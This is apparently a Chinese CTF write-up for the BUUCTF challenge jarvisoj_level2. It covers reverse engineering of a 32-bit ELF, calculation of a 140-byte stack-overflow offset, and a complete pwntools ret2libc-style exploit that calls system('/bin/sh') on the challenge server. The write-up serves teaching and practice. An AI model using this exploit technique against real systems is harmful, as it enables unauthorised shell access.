---
title: jarvisoj_level2 32位 ret2libc 栈溢出
date: 2026-05-09 20:28:00
categories:
  - pwn
tags:
  - 栈溢出
  - ret2libc
  - 32位
  - ROP
  - 栈传参
---

> BUUCTF 经典题 | 32位函数调用约定与 ROP 链构造

## 0x01 题目环境

| 项目 | 内容 |
|------|------|
| 题目名称 | jarvisoj_level2 (BUUCTF) |
| 架构 | 32位 Linux ELF (i386) |
| 保护机制 | NX 开启，无 Canary，无 PIE |
| 核心考点 | 栈溢出、32位栈传参、基础 ROP 链构造 |

## 0x02 逆向分析

### 阶段一：线索收集 (main 函数)

```asm
call    vulnerable_function       ; 跳转到漏洞函数
sub     esp, 0Ch
push    offset aEchoHelloWorld    ; "echo 'Hello World!'"
call    _system                   ; 调用 system()
```

**关键发现**：`main` 函数调用了 `system` 函数，意味着 `system` 已在 PLT 中，可直接调用。程序数据段通常也预留了 `/bin/sh` 字符串。

### 阶段二：漏洞定位

```asm
buf= byte ptr -88h      ; buf 距离 ebp 偏移 -0x88 (136字节)
push    100h            ; 最大读取长度：0x100 (256字节)
lea     eax, [ebp+buf]
push    eax
call    _read           ; 触发栈溢出
```

**偏移量计算**：
- 填满 buf：`0x88` = 136 字节
- 覆盖 Saved ebp：4 字节
- **总 Padding：136 + 4 = 140 字节**

## 0x03 漏洞利用思路：32位 ROP 链构造

与 64 位程序使用寄存器传参不同，**32 位程序通过栈传递参数**。

当劫持程序执行 `system("/bin/sh")` 时，必须在栈上手动伪造函数调用栈帧：

**32 位函数伪造调用栈结构**：

```
[140字节 Padding] + [system_addr] + [fake_return_addr] + [binsh_addr]
```

- `system_addr`：覆盖原返回地址
- `fake_return_addr`：system 执行完后的返回地址（随便填 4 字节垃圾）
- `binsh_addr`：system 的第一个参数

## 0x04 Exploit 代码

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.arch = 'i386'

elf = ELF('./level2')
io = remote('node5.buuoj.cn', 28036)

# 利用 pwntools 自动寻找目标地址
system_addr = elf.plt['system']
binsh_addr = next(elf.search(b'/bin/sh'))

log.success(f"Found system() at: {hex(system_addr)}")
log.success(f"Found '/bin/sh' at: {hex(binsh_addr)}")

# 构造 32 位栈传参 Payload
offset = 136 + 4
payload = b'A' * offset
payload += p32(system_addr)
payload += p32(0xdeadbeef)     # 伪造的返回地址
payload += p32(binsh_addr)     # system() 的第一个参数

io.recvuntil(b"Input:\n")
io.sendline(payload)
io.interactive()
```

## 0x05 核心考点

- **32 位栈传参**：参数通过栈传递，需手动伪造完整栈帧
- **PLT 表利用**：`main` 调用了 `system`，可直接使用 `elf.plt['system']`
- **字符串搜索**：`next(elf.search(b'/bin/sh'))` 自动查找 `/bin/sh` 地址
- **偏移计算**：`buf(136) + saved_ebp(4) = 140` 字节
